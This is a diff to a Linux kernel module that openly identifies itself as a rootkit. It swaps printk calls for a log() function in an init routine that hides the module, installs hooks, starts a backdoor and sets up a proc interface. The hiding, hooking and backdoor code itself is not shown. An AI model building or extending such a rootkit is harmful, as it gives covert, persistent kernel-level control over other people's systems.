@@ -13,28 +13,28 @@ MODULE_VERSION("0.1");
 
 //insmod
 static int __init lkm_init(void){
-	printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
+	log("ROOTKIT: Starting Rootkit ---------------------------------\n");
 	if (HIDE_MODULE){
 		if (hide_module() == -1){
-			printk(KERN_INFO "ROOTKIT: INIT ERROR hiding module\n");
+			log(KERN_INFO "ROOTKIT: INIT ERROR hiding module\n");
 			goto err_hide;
 		}
 	}
 
 	if (hooks_init() == -1){
-		printk(KERN_INFO "ROOTKIT: INIT ERROR hooks\n");
+		log(KERN_INFO "ROOTKIT: INIT ERROR hooks\n");
 		goto err_hooks;
 	}
 
 	if (BACKDOOR){
 		if (backdoor_init() == -1){
-			printk(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
+			log(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
 			goto err_backdoor;
 		}
 	}
 
 	if (proc_init() == -1){
-		printk(KERN_INFO "ROOTKIT: INIT ERROR proc\n");
+		log(KERN_INFO "ROOTKIT: INIT ERROR proc\n");
 		goto err_proc;
 	}
 
@@ -60,7 +60,7 @@ static void __exit lkm_exit(void){
 	hooks_exit();
 	if (is_module_hidden()) unhide_module(); //I think lkm_exit won't be executed if the module is hidden
 	delete_lists();
-	printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
+	log("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
 }
 
 module_init(lkm_init);
